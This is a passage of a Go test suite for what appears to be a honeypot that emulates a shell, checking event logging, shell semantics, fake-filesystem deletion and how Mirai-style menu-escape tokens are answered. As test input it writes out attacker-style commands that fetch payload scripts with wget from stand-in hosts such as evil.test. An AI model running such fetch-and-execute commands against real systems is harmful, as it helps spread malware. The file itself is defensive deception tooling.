		t.Fatalf("unexpected ls -l layout: %v", lsFields)
	}
	lsOwner := lsFields[2]
	lsSize, err := strconv.Atoi(lsFields[len(lsFields)-5])
	if err != nil {
		t.Fatalf("could not parse size from ls -l: %v", lsFields)
	}

	// stat: pull Size: and the Uid owner name.
	statOut := run(h, "stat /etc/passwd")
	sm := regexp.MustCompile(`Size:\s*(\d+)`).FindStringSubmatch(statOut)
	om := regexp.MustCompile(`Uid:\s*\(\s*\d+/\s*([A-Za-z0-9_-]+)\)`).FindStringSubmatch(statOut)
	if sm == nil || om == nil {
		t.Fatalf("could not parse stat output: %q", statOut)
	}
	statSize, _ := strconv.Atoi(sm[1])
	statOwner := om[1]

	// wc -c: the byte count is the leading integer on the line naming the file.
	wcSize, ok := leadingIntLine(run(h, "wc -c /etc/passwd"), "passwd")
	if !ok {
		t.Fatal("could not parse the byte count from wc -c")
	}

	if !(lsSize == statSize && statSize == wcSize) {
		t.Fatalf("size disagreement: ls=%d stat=%d wc=%d", lsSize, statSize, wcSize)
	}
	if lsOwner != "root" || statOwner != "root" {
		t.Fatalf("owner disagreement: ls=%q stat=%q", lsOwner, statOwner)
	}
}

// TestSessionIdCorrelatesWholeConnection proves every event from one connection
// carries the same non-empty session id, so an analyst can stitch the login, the
// commands, the download attempt, and the teardown back into a single story.
func TestSessionIdCorrelatesWholeConnection(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")
	run(h, "whoami")
	run(h, "wget http://198.51.100.7/y.sh")
	run(h, "exit")
	h.WaitEvent("SESSION_END", 2*time.Second)

	want := []string{"SESSION_START", "CREDENTIAL", "COMMAND", "DOWNLOAD_ATTEMPT", "SESSION_END"}
	var ids []string
	for _, name := range want {
		e, ok := h.FindEvent(name)
		if !ok {
			t.Fatalf("missing %s event", name)
		}
		if e.Session == "" {
			t.Fatalf("%s event has an empty session id", name)
		}
		ids = append(ids, e.Session)
	}
	for i, id := range ids {
		if id != ids[0] {
			t.Fatalf("%s session id %q does not match %q", want[i], id, ids[0])
		}
	}
}

// TestShellSemanticsInContext exercises the small bash subset end to end: chain
// operators honour exit status, $? carries it, double quotes preserve spacing,
// and a variable-expanded wget still records the real download target.
func TestShellSemanticsInContext(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")

	if out := run(h, "false && echo NO"); strings.Contains(out, "NO") {
		t.Fatalf("&& ran the right side after a false left side: %q", out)
	}
	if out := run(h, "false || echo YES"); !strings.Contains(out, "YES") {
		t.Fatalf("|| did not run the right side after a false left side: %q", out)
	}
	out := run(h, "cat /nope; echo $?")
	if !strings.Contains(out, "No such file") {
		t.Fatalf("cat of a missing file did not error: %q", out)
	}
	if !hasLine(out, "1") {
		t.Fatalf("$? did not carry the failed exit code 1: %q", out)
	}
	if out := run(h, `echo "a   b"`); !strings.Contains(out, "a   b") {
		t.Fatalf("double-quoted spacing was collapsed: %q", out)
	}

	run(h, "URL=http://evil.test/x.sh; wget $URL")
	e, ok := h.WaitEvent("DOWNLOAD_ATTEMPT", 2*time.Second)
	if !ok {
		t.Fatal("a variable-expanded wget did not log a DOWNLOAD_ATTEMPT")
	}
	if !strings.Contains(e.URL, "evil.test") {
		t.Fatalf("download url not expanded from $URL: %q", e.URL)
	}
}

// TestOverlayDeletionCoherent proves deletions are coherent across the views that
// follow them, both for a freshly created overlay file and for a base file hidden
// behind a session-local tombstone: once removed, the file is neither listed nor
// readable.
func TestOverlayDeletionCoherent(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")

	// An overlay file created then removed disappears from both ls and cat.
	run(h, "touch /tmp/zz")
	run(h, "rm /tmp/zz")
	if out := run(h, "ls /tmp"); strings.Contains(out, "zz") {
		t.Fatalf("removed overlay file is still listed: %q", out)
	}
	if out := run(h, "cat /tmp/zz"); !strings.Contains(out, "No such file") {
		t.Fatalf("removed overlay file is still readable: %q", out)
	}

	// A base file removed in-session is tombstoned: gone from ls and from cat.
	run(h, "rm /etc/hosts")
	if out := run(h, "ls /etc"); strings.Contains(out, "hosts") {
		t.Fatalf("tombstoned base file is still listed: %q", out)
	}
	if out := run(h, "cat /etc/hosts"); !strings.Contains(out, "No such file") {
		t.Fatalf("tombstoned base file is still readable: %q", out)
	}
}

// firstLineWith returns the first line of out containing substr, trimmed of a
// trailing carriage return, or "" if none.
func firstLineWith(out, substr string) string {
	for line := range strings.SplitSeq(out, "\n") {
		if strings.Contains(line, substr) {
			return strings.TrimRight(line, "\r")
		}
	}
	return ""
}

// firstInt returns the first run of decimal digits in s as an integer.
func firstInt(s string) (int, bool) {
	m := regexp.MustCompile(`\d+`).FindString(s)
	if m == "" {
		return 0, false
	}
	n, err := strconv.Atoi(m)
	return n, err == nil
}

// valueAfterColon returns the trimmed value after the first colon on the first
// line of out containing label.
func valueAfterColon(out, label string) string {
	line := firstLineWith(out, label)
	parts := strings.SplitN(line, ":", 2)
	if len(parts) < 2 {
		return ""
	}
	return strings.TrimSpace(parts[1])
}

// leadingIntLine returns the integer at the start of the first line whose first
// whitespace field is all digits and that also contains want.
func leadingIntLine(out, want string) (int, bool) {
	for line := range strings.SplitSeq(out, "\n") {
		fields := strings.Fields(line)
		if len(fields) == 0 || !allDigits(fields[0]) {
			continue
		}
		if want != "" {
			matched := false
			for _, f := range fields {
				if strings.Contains(f, want) {
					matched = true
					break
				}
			}
			if !matched {
				continue
			}
		}
		if n, err := strconv.Atoi(fields[0]); err == nil {
			return n, true
		}
	}
	return 0, false
}

func allDigits(s string) bool {
	if s == "" {
		return false
	}
	for _, c := range s {
		if c < '0' || c > '9' {
			return false
		}
	}
	return true
}

// hasLine reports whether any line of out, trimmed of surrounding whitespace and
// a trailing carriage return, equals target.
func hasLine(out, target string) bool {
	for line := range strings.SplitSeq(out, "\n") {
		if strings.TrimSpace(strings.TrimRight(line, "\r")) == target {
			return true
		}
	}
	return false
}

// TestApplianceMenuEscapeIsSilentShellTransition checks that on the appliance
// (IoT) persona the Mirai menu-escape tokens succeed silently — the device's
// CLI-to-shell transition — and leave a working shell, so a loader proceeds to
// recon and the payload pull instead of bailing on a bash "command not found".
func TestApplianceMenuEscapeIsSilentShellTransition(t *testing.T) {
	p := persona.GenerateProfile("legacy")
	fs, err := fakehost.Load(p)
	if err != nil {
		t.Fatal(err)
	}
	h, err := testharness.New(telnet.New(fs, p, "ubuntu"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(h.Close)
	login(t, h, p, "root")

	for _, tok := range []string{"enable", "system", "shell", "linuxshell"} {
		out := run(h, tok)
		if strings.Contains(out, "not found") || strings.Contains(out, "-bash") {
			t.Errorf("appliance %q should be a silent shell transition, got %q", tok, out)
		}
	}
	// The shell still works after the escape sequence: recon returns real output.
	if out := run(h, "uname -m"); !strings.Contains(out, "aarch64") {
		t.Errorf("shell broken after menu escape: %q", out)
	}
}

// TestServerMenuEscapeStaysCommandNotFound checks that on a server persona, which
// is already a bash shell where the IoT menu words are not real commands, the
// escape tokens stay "command not found" — the coherent response for a real box.
func TestServerMenuEscapeStaysCommandNotFound(t *testing.T) {
	p := persona.GenerateProfile("full")
	fs, err := fakehost.Load(p)
	if err != nil {
		t.Fatal(err)
	}
	h, err := testharness.New(telnet.New(fs, p, "ubuntu"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(h.Close)
	login(t, h, p, "root")

	if out := run(h, "system"); !strings.Contains(out, "command not found") {
		t.Errorf("server menu-escape should be command not found, got %q", out)
	}
}
